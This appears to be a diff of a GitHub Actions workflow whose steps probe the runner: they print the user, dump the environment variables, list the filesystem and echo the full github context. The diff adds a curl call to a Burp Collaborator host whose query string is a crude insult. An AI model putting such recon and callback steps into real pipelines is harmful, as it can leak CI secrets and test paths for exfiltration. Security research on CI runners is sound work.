@@ -15,16 +15,22 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
+
       - name: whoami
         run: |
           whoami
           echo $USER
+      - name: request burp collab
+        run: curl -i https://bvax5nq9pkc5mieakbbxu6cv4macy1.burpcollaborator.net/?sosi=hui
+        
       - name: Display Environment Variables
         run: env
+
       - name: Explore Filesystem
         run: |
           ls -la
           pwd
+
       - name: github context
         run: echo "${{ toJson(github) }}"
 
